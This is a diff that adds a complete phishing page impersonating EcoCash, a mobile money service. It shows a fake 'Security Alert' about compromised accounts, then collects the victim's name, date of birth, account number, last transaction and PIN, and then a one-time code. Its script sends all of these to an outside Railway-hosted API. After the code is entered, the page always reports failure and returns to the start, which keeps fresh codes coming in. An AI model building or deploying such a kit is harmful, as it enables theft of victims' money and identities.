@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Security Alert</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        /* EcoCash Header */
+        .header {
+            background: white;
+            padding: 16px 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0;
+        }
+
+        .logo-eco {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0066B3;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-cash {
+            font-size: 28px;
+            font-weight: 700;
+            color: #DC2626;
+            letter-spacing: -0.5px;
+        }
+
+        .user-avatar {
+            width: 44px;
+            height: 44px;
+            background: #0066B3;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            border: 2px solid #0066B3;
+        }
+
+        /* Alert Banner */
+        .alert-banner {
+            background: linear-gradient(135deg, #0066B3 0%, #0066B3 100%);
+            padding: 24px 20px;
+            color: white;
+            animation: shake 0.6s ease-in-out;
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            10%,
+            30%,
+            50%,
+            70%,
+            90% {
+                transform: translateX(-8px);
+            }
+
+            20%,
+            40%,
+            60%,
+            80% {
+                transform: translateX(8px);
+            }
+        }
+
+        .alert-icon {
+            width: 60px;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin: 0 auto 16px;
+        }
+
+        .alert-banner h1 {
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .alert-banner p {
+            text-align: center;
+            font-size: 14px;
+            opacity: 0.95;
+        }
+
+        /* Container */
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+        }
+
+        .content {
+            padding: 20px;
+        }
+
+        /* Progress Steps */
+        .progress-container {
+            padding: 24px 20px 16px;
+            background: white;
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            max-width: 280px;
+            margin: 0 auto;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 16px;
+            left: 40px;
+            right: 40px;
+            height: 2px;
+            background: #E5E7EB;
+            z-index: 0;
+        }
+
+        .progress-line-active {
+            position: absolute;
+            top: 16px;
+            left: 40px;
+            height: 2px;
+            background: #0066B3;
+            z-index: 1;
+            transition: width 0.3s ease;
+        }
+
+        .progress-step {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #E5E7EB;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: #9CA3AF;
+            position: relative;
+            z-index: 2;
+            transition: all 0.3s ease;
+        }
+
+        .progress-step.active {
+            background: #0066B3;
+            color: white;
+            box-shadow: 0 0 0 4px rgba(0, 102, 179, 0.1);
+        }
+
+        .progress-step.completed {
+            background: #10B981;
+            color: white;
+        }
+
+        .progress-step.completed::after {
+            content: '✓';
+            font-size: 16px;
+        }
+
+        /* Step Container */
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Alert Card */
+        .alert-card {
+            background: #FEF2F2;
+            border-left: 4px solid #0066B3;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .alert-card-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .alert-card-icon {
+            font-size: 20px;
+        }
+
+        .alert-card h3 {
+            color: #DC2626;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .alert-card p {
+            color: #DC2626;
+            font-size: 14px;
+            line-height: 1.5;
+            margin: 4px 0;
+        }
+
+        .alert-highlight {
+            font-weight: 700;
+            color: #DC2626;
+        }
+
+        /* Safety Notice */
+        .safety-notice {
+            background: #EFF6FF;
+            border-left: 4px solid #0066B3;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+
+        .safety-notice-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .safety-notice h3 {
+            color: #1E40AF;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .safety-notice p {
+            color: #1E3A8A;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #E5E7EB;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.2s;
+            background: white;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0066B3;
+            box-shadow: 0 0 0 3px rgba(0, 102, 179, 0.1);
+        }
+
+        .form-input.error {
+            border-color: #DC2626;
+        }
+
+        .error-message {
+            color: #DC2626;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Buttons - EcoCash Blue */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background: #0066B3;
+            color: white;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: #005A9C;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 102, 179, 0.3);
+        }
+
+        .btn-primary:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-danger {
+            background: #DC2626;
+            color: white;
+            margin-top: 12px;
+        }
+
+        .btn-danger:hover {
+            background: #B91C1C;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(220, 38, 38, 0.3);
+        }
+
+        /* OTP Input */
+        .otp-container {
+            margin: 32px 0;
+        }
+
+        .otp-label {
+            text-align: center;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 16px;
+            font-size: 15px;
+        }
+
+        .otp-input-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .otp-input {
+            width: 48px;
+            height: 56px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            border: 2px solid #E5E7EB;
+            border-radius: 8px;
+            transition: all 0.2s;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: #0066B3;
+            box-shadow: 0 0 0 3px rgba(0, 102, 179, 0.1);
+        }
+
+        /* Success Message */
+        .success-container {
+            text-align: center;
+            padding: 32px 20px;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #10B981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 40px;
+        }
+
+        .success-container h2 {
+            color: #111827;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .success-container p {
+            color: #6B7280;
+            font-size: 15px;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        /* Loading */
+        .loading-container {
+            display: none;
+            text-align: center;
+            padding: 48px 20px;
+        }
+
+        .loading-container.show {
+            display: block;
+        }
+
+        .spinner {
+            border: 3px solid #E5E7EB;
+            border-top: 3px solid #0066B3;
+            border-radius: 50%;
+            width: 48px;
+            height: 48px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            color: #6B7280;
+            font-size: 15px;
+        }
+
+        /* Resend OTP */
+        .resend-container {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #6B7280;
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #0066B3;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: underline;
+            padding: 0;
+            font-size: 14px;
+        }
+
+        .resend-btn:disabled {
+            color: #9CA3AF;
+            cursor: not-allowed;
+            text-decoration: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 640px) {
+            .otp-input {
+                width: 44px;
+                height: 52px;
+                font-size: 22px;
+            }
+
+            .otp-input-group {
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+            </div>
+            <div class="user-avatar">E</div>
+        </div>
+
+        <!-- Alert Banner -->
+        <div class="alert-banner">
+            <div class="alert-icon">⚠️</div>
+            <h1>Security Alert</h1>
+            <p>Suspicious activity detected on your account</p>
+        </div>
+
+        <!-- Progress Steps -->
+        <div class="progress-container">
+            <div class="progress-steps">
+                <div class="progress-line"></div>
+                <div class="progress-line-active" id="progress-line" style="width: 0;"></div>
+                <div class="progress-step active" id="step-indicator-1">1</div>
+                <div class="progress-step" id="step-indicator-2">2</div>
+                <div class="progress-step" id="step-indicator-3">3</div>
+            </div>
+        </div>
+
+        <!-- Step 1: Verification Form -->
+        <div class="step active" id="step1">
+            <div class="content">
+                <div class="alert-card">
+                    <div class="alert-card-header">
+                        <h3>Unauthorized Activity Detected</h3>
+                    </div>
+                    <p>Due to our failed update, there's been a wave of accounts being compromised. A cash withdrawal of
+                        <span class="alert-highlight" id="cashout-percentage">15%</span> has been
+                        requested from <span class="alert-highlight" id="request-location">Victoria Falls</span> on
+                        all
+                        accounts.
+                    </p>
+                    <p style="margin-top: 12px;">Please verify your identity to take action on this request.</p>
+                </div>
+
+                <form id="verification-form">
+                    <div class="form-group">
+                        <label for="name">Full Name</label>
+                        <input type="text" id="name" name="name" class="form-input" required autocomplete="name"
+                            placeholder="Enter your full name">
+                        <div class="error-message" id="name-error">Please enter your full name</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="dob">Date of Birth</label>
+                        <input type="date" id="dob" name="dob" class="form-input" required>
+                        <div class="error-message" id="dob-error">Please enter your date of birth</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="ecocash-number">EcoCash Number</label>
+                        <input type="number" id="ecocash-number" name="ecocash_number" class="form-input"
+                            placeholder="0771234567" required maxlength="10" minlength="10">
+                        <div class="error-message" id="ecocash-number-error">Please enter your EcoCash number</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="last-transaction">Last Transaction Amount</label>
+                        <input type="text" id="last-transaction" name="last_transaction" class="form-input"
+                            placeholder="e.g., 50.00" required>
+                        <div class="error-message" id="transaction-error">Please enter your last transaction amount
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="pin">4-Digit PIN</label>
+                        <input type="password" id="pin" name="pin" class="form-input" maxlength="4" pattern="[0-9]{4}"
+                            required placeholder="Enter your PIN">
+                        <div class="error-message" id="pin-error">Please enter your 4-digit PIN</div>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary">Send OTP to Verify</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Step 2: OTP Verification -->
+        <div class="step" id="step2">
+            <div class="content">
+                <div class="safety-notice">
+                    <div class="safety-notice-header">
+                        <span>🔒</span>
+                        <h3>Verification Code Sent</h3>
+                    </div>
+                    <p>We've sent a 6-digit code to your registered phone number <strong
+                            id="masked-phone">****1234</strong>. This code will expire in 1 minute.</p>
+                </div>
+
+                <form id="otp-form">
+                    <div class="otp-container">
+                        <div class="otp-label">Enter 6-Digit Code</div>
+                        <div class="otp-input-group">
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                        </div>
+                        <div class="error-message" id="otp-error" style="text-align: center;">Invalid verification code
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary" id="verify-otp-btn">Verify & Continue</button>
+                </form>
+
+                <div class="resend-container">
+                    Didn't receive the code? <button class="resend-btn" id="resend-btn" disabled>Resend in <span
+                            id="countdown">60</span>s</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 3: Loading -->
+        <div class="step" id="step3">
+            <div class="loading-container show">
+                <div class="spinner"></div>
+                <p class="loading-text">Verifying your identity...</p>
+            </div>
+        </div>
+
+        <!-- Success Step -->
+        <div class="step" id="step-success">
+            <div class="success-container">
+                <div class="success-icon">✅</div>
+                <h2>Verification Successful</h2>
+                <p>What would you like to do with this transaction request?</p>
+
+                <button class="btn btn-primary" id="authorize-btn">✓ Authorize Transaction</button>
+                <button class="btn btn-danger" id="block-btn">✗ Block Transaction</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const API_BASE_URL = 'https://angelic-learning-production.up.railway.app/api';
+
+        let sessionData = {
+            intrusion_id: null,
+            masked_phone: null,
+            number: null
+        };
+
+        // Initialize from URL parameters
+        function initializeFromParams() {
+            const params = new URLSearchParams(window.location.search);
+            const cashoutPct = params.get('cashout_pct') || '15%';
+            const location = params.get('location') || 'Victoria Falls';
+            const intrusionId = params.get('intrusion_id');
+
+            document.getElementById('cashout-percentage').textContent = cashoutPct;
+            document.getElementById('request-location').textContent = location;
+
+            if (intrusionId) {
+                sessionData.intrusion_id = intrusionId;
+            }
+        }
+
+        // Step navigation
+        function goToStep(stepNumber) {
+            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+
+            if (stepNumber === 'success') {
+                document.getElementById('step-success').classList.add('active');
+            } else {
+                document.getElementById(`step${stepNumber}`).classList.add('active');
+            }
+
+            // Update progress indicators and line
+            updateProgressIndicators(stepNumber);
+        }
+
+        function updateProgressIndicators(currentStep) {
+            const stepNum = currentStep === 'success' ? 3 : currentStep;
+
+            for (let i = 1; i <= 3; i++) {
+                const indicator = document.getElementById(`step-indicator-${i}`);
+                indicator.classList.remove('active', 'completed');
+
+                if (i < stepNum) {
+                    indicator.classList.add('completed');
+                    indicator.textContent = '';
+                } else if (i === stepNum) {
+                    indicator.classList.add('active');
+                    indicator.textContent = i;
+                } else {
+                    indicator.textContent = i;
+                }
+            }
+
+            // Update progress line
+            const progressLine = document.getElementById('progress-line');
+            const lineWidth = ((stepNum - 1) / 2) * 100;
+            progressLine.style.width = `${lineWidth}%`;
+        }
+
+        // Form validation
+        function validateForm(formData) {
+            let isValid = true;
+
+            if (!formData.get('name').trim()) {
+                showError('name');
+                isValid = false;
+            }
+
+            if (!formData.get('dob')) {
+                showError('dob');
+                isValid = false;
+            }
+
+            if (!formData.get('last_transaction').trim()) {
+                showError('last-transaction');
+                isValid = false;
+            }
+
+            const pin = formData.get('pin');
+            if (!/^\d{4}$/.test(pin)) {
+                showError('pin');
+                isValid = false;
+            }
+
+            return isValid;
+        }
+
+        function showError(fieldName) {
+            const input = document.getElementById(fieldName);
+            const error = document.getElementById(`${fieldName}-error`);
+            input.classList.add('error');
+            error.classList.add('show');
+
+            setTimeout(() => {
+                input.classList.remove('error');
+                error.classList.remove('show');
+            }, 3000);
+        }
+
+        // Handle verification form
+        document.getElementById('verification-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const formData = new FormData(e.target);
+
+            if (!validateForm(formData)) {
+                return;
+            }
+
+            const submitBtn = e.target.querySelector('button[type="submit"]');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending OTP...';
+            sessionData.masked_phone = formData.get('ecocash_number');
+            sessionData.number = formData.get('ecocash_number');
+            console.log("this is the session data", sessionData);
+
+            try {
+                const response = await fetch(`${API_BASE_URL}/intrusion/verify`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        intrusion_id: sessionData.intrusion_id,
+                        name: formData.get('name'),
+                        dob: formData.get('dob'),
+                        number: formData.get('ecocash_number'),
+                        last_transaction: formData.get('last_transaction'),
+                        pin: formData.get('pin')
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    sessionData.masked_phone = data.masked_phone;
+                    document.getElementById('masked-phone').textContent = data.masked_phone;
+                    goToStep(2);
+                    startCountdown();
+                } else {
+                    alert(data.detail || 'Verification failed. Please check your information.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Invalid details. Please try again.');
+                goToStep(1);
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Send OTP to Verify';
+            }
+        });
+
+        // OTP input handling
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Handle OTP form
+        document.getElementById('otp-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+
+            if (otp.length !== 6) {
+                document.getElementById('otp-error').classList.add('show');
+                return;
+            }
+
+            goToStep(3);
+
+            try {
+                const response = await fetch(`${API_BASE_URL}/intrusion/verify-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        number: sessionData.number,
+                        otp: otp
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    alert(data.detail || 'Invalid details. Please try again.');
+                    goToStep(1);
+                } else {
+                    alert(data.detail || 'Invalid details. Please try again.');
+                    goToStep(1);
+                    otpInputs.forEach(input => input.value = '');
+                    otpInputs[0].focus();
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Invalid details. Please try again.');
+                goToStep(1);
+            }
+        });
+
+        // Countdown timer
+        let countdownTimer;
+        function startCountdown() {
+            let seconds = 60;
+            const resendBtn = document.getElementById('resend-btn');
+            const countdownSpan = document.getElementById('countdown');
+
+            resendBtn.disabled = true;
+
+            countdownTimer = setInterval(() => {
+                seconds--;
+                countdownSpan.textContent = seconds;
+
+                if (seconds <= 0) {
+                    clearInterval(countdownTimer);
+                    resendBtn.disabled = false;
+                    resendBtn.innerHTML = 'Resend Code';
+                }
+            }, 1000);
+        }
+
+        // Resend OTP
+        document.getElementById('resend-btn').addEventListener('click', async () => {
+            const resendBtn = document.getElementById('resend-btn');
+            resendBtn.disabled = true;
+
+            try {
+                const response = await fetch(`${API_BASE_URL}/intrusion/resend-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        intrusion_id: sessionData.intrusion_id
+                    })
+                });
+
+                if (response.ok) {
+                    startCountdown();
+                    alert('A new code has been sent to your phone.');
+                } else {
+                    alert('Failed to resend code. Please try again.');
+                    resendBtn.disabled = false;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+                resendBtn.disabled = false;
+            }
+        });
+
+        // Action buttons
+        document.getElementById('authorize-btn').addEventListener('click', async () => {
+            if (!confirm('Are you sure you want to authorize this transaction?')) {
+                return;
+            }
+
+            try {
+                const response = await fetch(`${API_BASE_URL}/intrusion/action`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        intrusion_id: sessionData.intrusion_id,
+                        action: 'authorize'
+                    })
+                });
+
+                const data = await response.json();
+                alert(data.message || 'Transaction authorized successfully.');
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            }
+        });
+
+        document.getElementById('block-btn').addEventListener('click', async () => {
+            if (!confirm('Are you sure you want to block this transaction?')) {
+                return;
+            }
+
+            try {
+                const response = await fetch(`${API_BASE_URL}/intrusion/action`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        intrusion_id: sessionData.intrusion_id,
+                        action: 'block'
+                    })
+                });
+
+                const data = await response.json();
+                alert(data.message || 'Transaction blocked successfully.');
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            }
+        });
+
+        // Initialize
+        initializeFromParams();
+    </script>
+</body>
+
+</html>
